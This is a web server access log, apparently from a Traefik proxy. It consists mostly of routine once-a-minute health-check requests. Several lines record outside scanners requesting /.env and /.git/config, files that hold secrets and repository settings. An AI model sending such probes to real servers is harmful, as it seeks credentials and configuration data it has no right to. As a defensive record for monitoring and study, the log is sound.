159.203.109.206 - - [18/Dec/2023:14:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5389 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:50:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5390 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:14:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5391 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:14:51:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5392 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:14:52:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5393 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:52:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5394 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:14:53:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5395 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:53:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5396 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:14:54:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5397 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:54:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5398 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:14:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5399 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:55:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5400 "www@docker" "http://172.18.0.9:80" 1ms
180.149.125.171 - - [18/Dec/2023:14:56:08 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 5401 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:14:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5402 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:56:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5403 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:14:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5404 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:57:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5405 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:14:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5406 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:14:58:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5407 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [18/Dec/2023:14:59:13 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 5408 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:14:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5409 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:14:59:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5410 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:15:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5411 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:00:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5412 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:15:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5413 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:15:01:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5414 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:15:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5415 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:02:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5416 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:15:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5417 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:03:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5418 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:15:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5419 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:15:04:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5420 "www@docker" "http://172.18.0.9:80" 0ms
172.104.210.105 - - [18/Dec/2023:15:05:04 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 5421 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:15:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5422 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:05:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5423 "www@docker" "http://172.18.0.9:80" 1ms
45.79.128.205 - - [18/Dec/2023:15:05:40 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 5424 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:15:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5425 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:06:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5426 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:15:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5427 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:07:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5428 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:15:08:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5429 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:08:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5430 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:15:09:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5431 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:15:09:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5432 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:15:10:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5433 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:10:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5434 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:15:11:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5435 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:15:11:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5436 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:15:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5437 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:12:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5438 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:15:13:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5439 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:13:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5440 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:15:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5441 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:15:14:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5442 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:15:15:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5443 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:15:15:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5444 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:15:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5445 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [18/Dec/2023:15:16:35 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 5446 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [18/Dec/2023:15:16:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5447 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:15:17:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5448 "www@docker" "http://172.18.0.9:80" 1ms
101.36.114.198 - - [18/Dec/2023:15:17:26 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 5449 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:15:17:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5450 "www@docker" "http://172.18.0.9:80" 0ms
101.36.114.198 - - [18/Dec/2023:15:17:47 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 5451 "-" "-" 0ms
101.36.114.198 - - [18/Dec/2023:15:17:49 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 5452 "-" "-" 0ms
101.36.114.198 - - [18/Dec/2023:15:17:50 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 5453 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:15:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5454 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:18:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5455 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:15:19:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5456 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:19:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5457 "www@docker" "http://172.18.0.9:80" 1ms
68.69.186.30 - - [18/Dec/2023:15:20:06 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 5458 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:15:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5459 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:15:20:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5460 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:15:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5461 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:21:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5462 "www@docker" "http://172.18.0.9:80" 1ms
165.154.182.154 - - [18/Dec/2023:15:21:45 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 5463 "-" "-" 0ms
165.154.182.154 - - [18/Dec/2023:15:22:04 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 5464 "-" "-" 0ms
165.154.182.154 - - [18/Dec/2023:15:22:05 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 5465 "-" "-" 0ms
165.154.182.154 - - [18/Dec/2023:15:22:06 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 5466 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:15:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5467 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:15:22:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5468 "www@docker" "http://172.18.0.9:80" 0ms
69.164.217.74 - - [18/Dec/2023:15:22:45 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 5469 "-" "-" 0ms
172.105.128.11 - - [18/Dec/2023:15:22:55 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 5470 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:15:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5471 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:23:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5472 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:15:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5473 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:24:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5474 "www@docker" "http://172.18.0.9:80" 0ms
54.36.115.221 - - [18/Dec/2023:15:24:54 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 5475 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [18/Dec/2023:15:24:54 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 5476 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:15:25:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5477 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:25:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5478 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:15:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5479 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:26:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5480 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:15:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5481 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:15:27:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5482 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:15:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5483 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:28:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5484 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:15:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5485 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:29:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5486 "www@docker" "http://172.18.0.9:80" 1ms
54.37.79.75 - - [18/Dec/2023:15:29:44 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 5487 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [18/Dec/2023:15:29:45 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 5488 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:15:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5489 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:30:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5490 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:15:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5491 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:31:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5492 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:15:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5493 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:32:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5494 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:15:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5495 "www@docker" "http://172.18.0.9:80" 1ms
170.64.186.169 - - [18/Dec/2023:15:33:30 +0000] "GET /.git/config HTTP/1.1" 301 17 "-" "-" 5496 "web-to-websecure@internal" "-" 0ms
170.64.186.169 - - [18/Dec/2023:15:33:31 +0000] "GET /.git/config HTTP/1.1" 404 19 "-" "-" 5497 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:15:33:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5498 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:15:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5499 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:34:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5500 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:15:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5501 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:15:35:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5502 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:15:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5503 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:15:36:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5504 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:15:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5505 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:37:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5506 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:15:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5507 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:15:38:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5508 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:15:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5509 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:39:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5510 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:15:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5511 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:40:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5512 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:15:41:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5513 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:41:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5514 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:15:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5515 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:42:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5516 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:15:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5517 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:15:43:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5518 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:15:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5519 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:44:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5520 "www@docker" "http://172.18.0.9:80" 1ms
54.37.79.75 - - [18/Dec/2023:15:44:47 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 5521 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [18/Dec/2023:15:44:47 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 5522 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:15:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5523 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:45:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5524 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:15:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5525 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:46:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5526 "www@docker" "http://172.18.0.9:80" 0ms
152.32.235.96 - - [18/Dec/2023:15:46:58 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 5527 "-" "-" 0ms
152.32.235.96 - - [18/Dec/2023:15:47:17 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 5528 "-" "-" 0ms
152.32.235.96 - - [18/Dec/2023:15:47:18 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 5529 "-" "-" 0ms
152.32.235.96 - - [18/Dec/2023:15:47:19 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 5530 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:15:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5531 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:47:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5532 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:15:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5533 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:48:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5534 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:15:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5535 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:49:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5536 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:15:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5537 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:50:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5538 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:15:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5539 "www@docker" "http://172.18.0.9:80" 1ms
45.33.87.154 - - [18/Dec/2023:15:51:26 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 5540 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:15:51:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5541 "www@docker" "http://172.18.0.9:80" 0ms
172.105.128.11 - - [18/Dec/2023:15:51:46 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 5542 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:15:52:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5543 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:52:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5544 "www@docker" "http://172.18.0.9:80" 0ms
152.32.245.5 - - [18/Dec/2023:15:53:02 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 5545 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:15:53:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5546 "www@docker" "http://172.18.0.9:80" 0ms
152.32.245.5 - - [18/Dec/2023:15:53:22 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 5547 "-" "-" 0ms
152.32.245.5 - - [18/Dec/2023:15:53:24 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 5548 "-" "-" 0ms
152.32.245.5 - - [18/Dec/2023:15:53:25 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 5549 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:15:53:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5550 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:15:54:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5551 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:54:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5552 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:15:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5553 "www@docker" "http://172.18.0.9:80" 0ms
51.254.59.113 - - [18/Dec/2023:15:55:22 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 5554 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [18/Dec/2023:15:55:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5555 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:15:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5556 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:15:56:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5557 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:15:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5558 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:57:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5559 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:15:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5560 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:58:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5561 "www@docker" "http://172.18.0.9:80" 1ms
180.149.125.165 - - [18/Dec/2023:15:59:02 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 5562 "web-to-websecure@internal" "-" 0ms
180.149.125.165 - - [18/Dec/2023:15:59:03 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 5563 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:15:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5564 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:15:59:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5565 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:16:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5566 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:00:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5567 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:16:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5568 "www@docker" "http://172.18.0.9:80" 6ms
167.71.120.76 - - [18/Dec/2023:16:01:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5569 "www@docker" "http://172.18.0.9:80" 1ms
45.142.182.77 - - [18/Dec/2023:16:02:01 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 5570 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:16:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5571 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:16:02:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5572 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:16:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5573 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:16:03:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5574 "www@docker" "http://172.18.0.9:80" 1ms
